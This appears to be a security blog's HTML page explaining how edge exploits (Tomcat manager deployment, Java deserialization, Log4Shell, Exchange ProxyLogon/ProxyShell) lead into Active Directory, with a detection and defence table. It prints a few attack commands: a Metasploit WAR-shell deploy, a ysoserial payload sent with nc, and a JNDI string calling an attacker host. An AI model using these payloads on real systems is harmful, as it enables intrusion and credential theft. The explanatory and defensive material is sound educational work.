@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Perimeter → Active Directory — Satej Chaudhari</title>
+  <meta name="description" content="Turning an external or edge foothold into a domain foothold — app-server exploitation, insecure deserialization, Log4Shell, and the Exchange pre-auth chains (ProxyLogon/ProxyShell) — and the pivot from a web shell into the AD attack path.">
+
+  <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script>
+  (function(){
+    try{var t=localStorage.getItem('theme');if(t==='light'||t==='dark')document.documentElement.setAttribute('data-theme',t);}catch(e){}
+    document.addEventListener('DOMContentLoaded',function(){
+      var b=document.querySelector('.theme-toggle');
+      if(b)b.addEventListener('click',function(){
+        var d=document.documentElement,c=d.getAttribute('data-theme')||'dark',n=c==='dark'?'light':'dark';
+        d.setAttribute('data-theme',n);try{localStorage.setItem('theme',n);}catch(e){}
+      });
+      var nt=document.querySelector('.nav-toggle'),nv=document.querySelector('.site-nav');
+      if(nt&&nv&&!nt.dataset.bound){nt.dataset.bound='1';nt.addEventListener('click',function(){var o=nv.classList.toggle('open');nt.setAttribute('aria-expanded',o?'true':'false');});}
+    });
+  })();
+  </script>
+</head>
+<body>
+
+  <header class="site-header">
+    <div class="wrap-wide">
+      <a class="brand" href="../index.html">
+        <span class="brand-mark">SC</span>
+        <span class="brand-name">Satej Chaudhari</span>
+      </a>
+      <nav class="site-nav">
+        <a href="../index.html">Home</a>
+        <a href="../writeups.html">Writeups</a>
+        <a href="../blog.html">Blog</a>
+        <a href="../theory.html">Theory</a>
+        <a href="../toolkit.html">Toolkit</a>
+        <a href="../vulns.html">Vulns &amp; Misconfigs</a>
+        <a href="https://github.com/satejchaudhari" target="_blank" rel="noopener" class="nav-external">GitHub</a>
+      </nav>
+      <button class="theme-toggle" aria-label="Toggle light and dark theme" title="Toggle theme">
+        <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+        <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+      </button>
+      <button class="nav-toggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+      </button>
+    </div>
+  </header>
+
+  <main class="wrap post">
+    <a class="post-back" href="../theory.html">&larr; back to theory</a>
+
+    <article>
+      <header class="post-header">
+        <span class="tag">AD</span>
+        <h1 class="post-title">Perimeter → Active Directory</h1>
+        <p class="post-meta">
+          <time datetime="2026-09-24">2026-09-24</time>
+          <span>&middot; 14 min read</span>
+        </p>
+      </header>
+
+      <div class="post-body">
+
+        <p>
+          Most Active Directory write-ups begin with "assume a foothold on the internal network." This
+          page is about earning that foothold. The perimeter — internet-facing web apps, mail servers,
+          management consoles — matters to a domain attacker for one reason: those boxes are usually
+          <strong>domain-joined</strong>, run as <strong>service accounts</strong>, and cache
+          credentials. Code execution on an edge server is rarely the goal in itself; it is the on-ramp
+          to the <a href="../ad-map.html">attack path</a>.
+        </p>
+
+        <blockquote>
+          The pivot mindset: a web shell is a process token. Ask what that token is
+          (<code>whoami /all</code>), what it can reach, and whose credentials are sitting in memory or
+          on disk next to it. A perimeter RCE becomes a domain compromise the moment you pull the first
+          domain credential off the host.
+        </blockquote>
+
+        <h2>Why the edge leads inward</h2>
+        <table>
+          <thead><tr><th>Edge asset</th><th>What it hands you</th></tr></thead>
+          <tbody>
+            <tr><td>Domain-joined web/app server</td><td>A machine account and a network position inside the domain</td></tr>
+            <tr><td>Service account context</td><td>Often <code>SeImpersonate</code> (→ SYSTEM) or excessive domain rights</td></tr>
+            <tr><td>Mail server (Exchange)</td><td>Historically over-privileged in AD — a short hop to Domain Admin</td></tr>
+            <tr><td>Cached / stored credentials</td><td>Config files, connection strings, and LSASS secrets for lateral movement</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Management consoles &amp; app-server deployment</h2>
+        <p>
+          Application servers are built to run code you give them — that is their function, and their
+          weakness. A weak or default credential on a management console usually means arbitrary code
+          execution by design:
+        </p>
+        <ul>
+          <li><strong>Tomcat / JBoss / WildFly</strong> — the manager app deploys a WAR; a deployed
+              WAR is a web shell.</li>
+          <li><strong>Jenkins</strong> — the Script Console runs Groovy as the Jenkins service account;
+              build steps run commands.</li>
+          <li><strong>WebLogic / WebSphere / GlassFish</strong> — admin consoles and, frequently,
+              unauthenticated deserialization endpoints (below).</li>
+        </ul>
+        <pre><code># Tomcat manager (after a weak-cred login): deploy a WAR shell
+msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_deploy; set RHOSTS &lt;ip&gt;; run'</code></pre>
+        <p>
+          Always try default and reused credentials first — it is the quietest path and it maps to the
+          <em>Default credentials</em> entry in <a href="../vulns.html">Vulns &amp; Misconfigs</a>.
+        </p>
+
+        <h2>Insecure deserialization</h2>
+        <p>
+          Many platforms accept serialized objects — Java serialized streams, .NET
+          <code>ViewState</code>/<code>BinaryFormatter</code>, RMI ports, message queues. If the server
+          deserializes attacker-controlled data and a suitable <em>gadget chain</em> exists on its
+          classpath, reconstructing the object graph triggers code execution. You are not exploiting
+          the data; you are exploiting the act of rebuilding objects from it.
+        </p>
+        <pre><code>java -jar ysoserial.jar CommonsCollections5 'cmd /c &lt;payload&gt;' | nc &lt;target&gt; &lt;rmi_port&gt;</code></pre>
+        <p>
+          The details are on the <a href="../vulns.html">Insecure deserialization</a> page; what
+          matters here is that it is a pre-auth RCE primitive on a domain-joined host, i.e. a perimeter
+          on-ramp. The same idea underlies the Exchange chains below.
+        </p>
+
+        <h2>Log4Shell (CVE-2021-44228)</h2>
+        <p>
+          Log4Shell is worth understanding in full because it is the archetype of "a logged string
+          becomes remote code execution." The vulnerable versions of the log4j library performed
+          <strong>message lookups</strong>: if a logged string contained a <code>${...}</code>
+          expression, log4j evaluated it. One supported lookup was <strong>JNDI</strong>, which can
+          resolve a name over LDAP or RMI and, in vulnerable configurations, fetch and instantiate a
+          remote Java class. So logging attacker input that contains a JNDI expression makes the server
+          reach out to the attacker and run their class:
+        </p>
+        <pre><code># place this where the app will log it — a header, User-Agent, username field, chat message:
+${jndi:ldap://&lt;attacker_ip&gt;:1389/a}
+# serve the referral + malicious class with a JNDI exploit kit; the app loads and runs it</code></pre>
+        <p>
+          It is devastating because the injection point is anything that gets logged (no
+          authentication needed), it is trivially <em>obfuscated</em>
+          (<code>${lower:j}</code>, nested lookups, <code>${env:...}</code>), and the early patches
+          were themselves bypassable — 2.15 still allowed some lookups, 2.16 disabled JNDI, and the
+          fully fixed line is 2.17.1+. Treat any Java service that echoes user input into logs as a
+          candidate. This maps to the <em>Command injection</em> family in
+          <a href="../vulns.html">Vulns &amp; Misconfigs</a>.
+        </p>
+
+        <h2>Exchange pre-auth chains (ProxyLogon / ProxyShell / ProxyNotShell)</h2>
+        <p>
+          On-premises Exchange deserves its own paragraph because it is both internet-facing and, by
+          design, <em>highly privileged in Active Directory</em> — the Exchange security groups have
+          historically held rights (like <code>WriteDacl</code> on the domain) that make an Exchange
+          compromise a near-direct path to Domain Admin (the basis of <em>PrivExchange</em>). The
+          modern pre-auth chains share a shape: a server-side request forgery reaches an internal
+          endpoint, and a follow-on primitive writes a web shell or runs code.
+        </p>
+        <table>
+          <thead><tr><th>Chain</th><th>Mechanism (high level)</th></tr></thead>
+          <tbody>
+            <tr><td>ProxyLogon (CVE-2021-26855 + 27065)</td><td>SSRF to the backend authenticates as the server, then an arbitrary file write drops an <code>.aspx</code> shell</td></tr>
+            <tr><td>ProxyShell (CVE-2021-34473 / 34523 / 31207)</td><td>Autodiscover path confusion → backend PowerShell → export a mailbox as a web shell</td></tr>
+            <tr><td>ProxyNotShell / OWASSRF</td><td>Later SSRF + remote PowerShell variants reviving the same pattern</td></tr>
+          </tbody>
+        </table>
+        <p>
+          Because the resulting shell runs as a highly-privileged Exchange process on a domain-joined
+          host, the pivot to the domain is short — often just enumerating the Exchange group rights and
+          abusing them, or relaying the machine account (see
+          <a href="2026-08-18-coercion-ntlm-relay.html">Coercion &amp; Relay</a>).
+        </p>
+
+        <h2>The pivot: from web shell to domain</h2>
+        <p>
+          However you land, the follow-through is the same and it feeds straight into the rest of the
+          <a href="../ad-map.html">map</a>:
+        </p>
+        <ol>
+          <li><strong>Identify the token</strong> — <code>whoami /all</code>; note privileges
+              (<code>SeImpersonate</code>?) and group memberships.</li>
+          <li><strong>Escalate locally</strong> — a <a href="2026-08-18-windows-tokens-uac.html">potato</a>
+              to SYSTEM if the service token allows it.</li>
+          <li><strong>Harvest credentials</strong> — <a href="2026-08-18-windows-credential-storage.html">LSASS,
+              SAM, DPAPI</a>, plus config files and connection strings on disk.</li>
+          <li><strong>Enumerate the domain</strong> — you are now an internal host; run BloodHound and
+              pick a path to Domain Admin.</li>
+        </ol>
+
+        <h2>Detection &amp; defence</h2>
+        <table>
+          <thead><tr><th>Control</th><th>Effect</th></tr></thead>
+          <tbody>
+            <tr><td>Patch aggressively and inventory internet-facing services</td><td>These are all known-CVE or known-misconfig classes — currency is the primary defence</td></tr>
+            <tr><td>Run edge services as low-privileged, non-domain or gMSA accounts; strip <code>SeImpersonate</code> where feasible</td><td>Breaks the token-to-SYSTEM and account-reuse pivots</td></tr>
+            <tr><td>Reduce Exchange's AD rights; isolate and monitor Exchange servers as Tier&nbsp;0-adjacent</td><td>Removes the historic Exchange-to-DA shortcut</td></tr>
+            <tr><td>Egress-filter server networks</td><td>Log4Shell/JNDI and deserialization stagers need outbound to the attacker — block it</td></tr>
+            <tr><td>Alert on web processes spawning shells, new <code>.aspx</code>/<code>.war</code> files, and outbound LDAP/RMI from app servers</td><td>Catches deployment, web-shell drops and JNDI callbacks</td></tr>
+            <tr><td>Change default credentials on every console</td><td>Closes the quietest path of all</td></tr>
+          </tbody>
+        </table>
+
+        <h2>The takeaway</h2>
+        <p>
+          The perimeter is not a separate discipline from AD — it is the first level of the same graph.
+          Edge exploitation (default consoles, deserialization, Log4Shell, Exchange chains) gets you a
+          process on a domain-joined host; the domain compromise begins the instant you turn that
+          process into a domain credential. Keep edge services patched, low-privileged and
+          egress-filtered, and treat Exchange as the crown-jewels-adjacent system it is. The
+          exploitation primitives are catalogued in <a href="../vulns.html">Vulns &amp; Misconfigs</a>,
+          and where you go next is the whole <a href="../ad-map.html">Attack-Path map</a>.
+        </p>
+        
+      </div>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="wrap-wide">
+      <p>&copy; 2026 Satej Chaudhari</p>
+      <div class="footer-links">
+        <a href="../writeups.html">Writeups</a>
+        <a href="../blog.html">Blog</a>
+        <a href="../theory.html">Theory</a>
+        <a href="../toolkit.html">Toolkit</a>
+        <a href="../vulns.html">Vulns &amp; Misconfigs</a>
+        <a href="../disclaimer.html">Disclaimer</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../assets/js/main.js"></script>
+</body>
+</html>
